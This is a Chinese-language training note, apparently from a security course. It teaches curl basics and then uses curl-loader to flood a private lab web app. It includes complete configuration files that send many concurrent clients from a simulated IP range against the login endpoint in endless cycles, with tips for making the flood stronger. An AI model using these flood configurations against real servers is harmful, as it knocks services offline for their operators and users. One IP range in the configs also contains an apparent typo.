[TOC]



# ==CURL处理HTTP请求==

## 一、curl命令

curl 是常用的命令行工具，用来请求 Web 服务器。他的名字就是客户端（Client） 的URL 工具 的意思，他的功能非常强大，命令行参数多达十几种。如果熟练的话完全可以取代 Postman 这一类的图形化工具，也是一个字符界面的浏览器。并且可以帮助我们更加直观的理解HTTP协议，可以发送Get请求和POST请求，提交文本框数据等

-  访问某个页面（发送GET请求）：

```

curl http://192.168.230.147:8083/woniusales
#没有任何结果
curl http://192.168.230.147:8083/woniusales/
#这样才会有结果
#因为没有 / 的话，浏览器会默认认为访问的是文件，但woniusales本来是个目录，要想访问woniusales就应该在woniusales后面添加 / 
#但是 / 后并没有带任何东西是因为访问的是该目录下的默认首页
```

为了探究更深刻的原因，我们用 Fidder 检测一下，在浏览器中 输入网址 http://192.168.230.147:8083/woniusales 我们去看Fidder中的响应

![image-20240129195344776](C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20240129195344776.png)

一共响应了两次，第一个就是 woniusales 第二个是 woniusales/ 我们去看第一个报文的内容

![image-20240129195841815](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240129195841815.png)

其报文给出的状态码为 302 ，表示重定向，即重定向为GET woniusales/

- 发送 POST 请求
  - -d 参数表示提交正文，因为此时我们需要向服务器提交数据才能成功访问

```
curl -d "username=admin&password=admin123&verifycode=0000" http://192.168.230.147:8083/woniusales/user/login
```

- 手动设置referer
  - referer是什么？就是访问一个服务器时，是从何处访问的
  - 比如我要访问www.woniuxy.com，如果我是通过baidu搜索访问的，那么referer就是搜索了蜗牛学院的baidu的页面；而如果我是通过URL地址栏手动输入的www.woniuxy.com，那么这个referer就是空

![image-20240129204338274](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240129204338274.png)

```
curl -e 'http://www.baidu.com?q=woniuxy' http://www.woniuxy.com
```

- 上传文件

```
curl -F 'file=@文件路径' http://woniusales/goods/upload
```

- 打印服务器响应 HTTP 报头

```
curl -i www.baidu.com
```

![image-20240129205709669](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240129205709669.png)

- 跳过 SSL 检测（忽略证书）

```
curl -k https://www.woniuxy.com/
```

![image-20240129205934001](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240129205934001.png)

![image-20240129205939120](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240129205939120.png)

## 二、安装curl-loader

curl-loader 是一款压力测试工具，利用其高并发性向服务器发起大量请求，进而实现流量泛洪攻击

（1）下载地址 http://sourceforge.net/projects/curl-loader/files/curl-loader/

（2）官方配置文件：http://curl-loader.sourceforge.net/index.html

（3）使用以下命令进行curl-loader安装

```
yum install bzip2 patch -y
tar -xjf curl-loader-0.56.tar.bz2
cd curl-loader-0.56
make
编译完成后会在当前目录下生成可执行程序：curl-loader
```

> 安装的过程中可能会遇到如下报错
>
> ```
> In file included from ssl_thr_lock.c:29:0:
> ssl_thr_lock.h:27:28: 致命错误：openssl/crypto.h：没有那个文件或目录
>  #include <openssl/crypto.h>
>                             ^
> 编译中断。
> make: *** [obj/ssl_thr_lock.o] 错误 1
> 
> ```
>
> 原因是因为缺少了 openssl 模块 ，需要下载
>
> ```
> yum install openssl-devel -y
> ```
>
> 然后再重新 make

## 三、使用curl-loader进行流量泛洪

#### 1.curl-loader配置

安装好了curl-loader之后，需要做如下操作

```
#创建一个文件夹存放curl，并且在该文件夹中同时存放两个文件
mkdir curl-loader

cp /opt/myloader/curl-loader-0.56/curl-loader /opt/curl-loader

cp /opt/myloader/curl-loader-0.56/conf-examples/10K.conf /opt/curl-loader

vi home_login.conf
#该文件内容如下形式
```

![image-20240130183829678](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240130183829678.png)

```
####################### GENERAL_SECTION ########################
BATCH_NAME=Home-Login
CLIENTS_NUM_MAX=20
INTERFACE=ens32
NETMASK=24
IP_ADDR_MIN=192.168.230.10
IP_ADDR_MAX=192.168.230.50
CYCLES_NUM=-1
URLS_NUM=2



###################### URL_SECTION ############################
# GET-part
URL= http://192.168.230.147:8083/woniusales/
URL_SHORT_NAME="Home-Get"
REQUEST_TYPE=GET
TIMER_URL_COMPLETION=3000
TIMER_AFTER_URL_SLEEP=100


# POST-part
URL="http://192.168.230.147:8083/woniusales/user/login"
URL_SHORT_NAME="Login-Post"
USERNAME=admin
PASSWORD=admin123
REQUEST_TYPE=POST
FORM_USAGE_TYPE=SINGLE_USER
FORM_STRING=username=%s&password=%s
TIMER_URL_COMPLETION=3000
TIMER_AFTER_URL_SLEEP=200

```

#### 2.泛洪操作和查看

```
curl-loader -f home_login.conf
```

在另一个窗口中动态查看 tomcat 的访问日志 /usr/local/tomcat/logs/localhost_access_log.2024-01-30.txt

```
tail -f /usr/local/tomcat/logs/localhost_access_log.2024-01-30.txt
```



![image-20240130183951437](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240130183951437.png)

就可以看到如下结果，以不同的IP访问，且最后的状态码也是200，表示成功，500表示服务器错误

> 要想使得泛洪攻击更加猛烈我们可以修改 home_login.conf 配置文件中的以下参数
>
> - CLIENTS_NUM_MAX=20
>   - 表示模拟的最大的客户端的数量，即并发量
>
> - IP_ADDR_MIN=192.168.230.10
>
>   - 表示模拟的IP地址的起始
>
> - IP_ADDR_MAX=192.168.230.50
>
>   - 表示模拟的IP地址的终止
>
> - CLIENTS_NUM_MAX=20
>
>   - 表示以多少线程进行高并发
>
> - FORM_USAGE_TYPE=SINGLE_USER
>
>   - 表示所有模拟的客户端都以一个账号登录
>
> - URL_DONT_CYCLE = 1
>
>   - 表示攻击只循环一次，要想循环就不写这个参数
>
> - ```
>   USERNAME=admin
>   PASSWORD=admin123
>   REQUEST_TYPE=POST
>   FORM_USAGE_TYPE=SINGLE_USER
>   FORM_STRING=username=%s&password=%s
>   ```
>
>   - 表示发送一个POST请求，其由正文数据，请求类型，账户使用情况，对应的正文数据参数
>
> - 更加详细的字段解释请看 [常见问题解答 (sourceforge.net)](https://curl-loader.sourceforge.net/doc/faq.html)

我们可以简单拿来看一下，我们泛洪攻击的效果

![image-20240130190719146](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240130190719146.png)

- 2XX表示正常，成功的登录

- 5XX表示服务器出错的，说明我们泛洪攻击还是有效果的
- Ti表示吞吐量进来的量，即请求量大小
- To表示吞吐量吐出去的量，即服务器响应量的大小

#### 3.home_login.conf配置文件写法

使用模版 /opt/myloader/curl-loader-0.56/conf-examples/get-post-login-cycling.conf 

> /opt/myloader/curl-loader-0.56/conf-examples/ 目录下的很多 conf 文件都是泛洪攻击的配置文件的模板，我们可以参考他们的写法

```
cp /opt/myloader/curl-loader-0.56/conf-examples/get-post-login-cycling.conf /opt/myloader
```

![image-20240130193955096](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240130193955096.png)

该文件原本内容如下图所示

![image-20240130194852395](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240130194852395.png)

我们将其修改为如下信息（//以后的信息为注释信息，不用写在文件里）

```
########### GENERAL SECTION ################################
BATCH_NAME=get_post_cycling
CLIENTS_NUM_MAX = 200	//所模拟客户端的数量，即并发的数量
INTERFACE=eth0
NETMASK=24	//子网掩码位数
IP_ADDR_MIN=192.168.230.5	//客户端起始IP
IP_ADDR_MAX=194.168.230.205 	//客户端终止IP
CYCLES_NUM= -1	//无限循环
URLS_NUM=2	//URL地址个数，即下面的URL个数


########### URL SECTION ##################################

### Login URL -  only once for each client

# GET-part
URL= http://192.168.230.147:8083/woniusales/
URL_SHORT_NAME="Login-GET"
#URL_DONT_CYCLE = 1
REQUEST_TYPE=GET
TIMER_URL_COMPLETION = 1000 # In msec. When positive, Now it is enforced by cancelling url fetch on timeout		//多少ms发一次请求
TIMER_AFTER_URL_SLEEP = 20	//发完一次请求休息多少ms

# POST-part
URL="http://192.168.230.147:8083/woniusales/user/login"
URL_USE_CURRENT= 1
URL_SHORT_NAME="Login-POST"
#URL_DONT_CYCLE = 1
USERNAME=admin
PASSWORD=admin123
REQUEST_TYPE=POST
FORM_USAGE_TYPE= SINGLE_USER
FORM_STRING= username=%s&password=%s # Means the same credentials for all clients/users
TIMER_URL_COMPLETION = 1000     # In msec. When positive, Now it is enforced by cancelling url fetch on timeout
TIMER_AFTER_URL_SLEEP = 20

```

其中部分信息我们可以使用 Fidder 先进行测试

![image-20240130195717767](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240130195717767.png)

![image-20240130195706057](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240130195706057.png)



![image-20240130195828265](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240130195828265.png)

![image-20240130195834655](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240130195834655.png)

其中一些GET和POST的URL地址请求就在里面

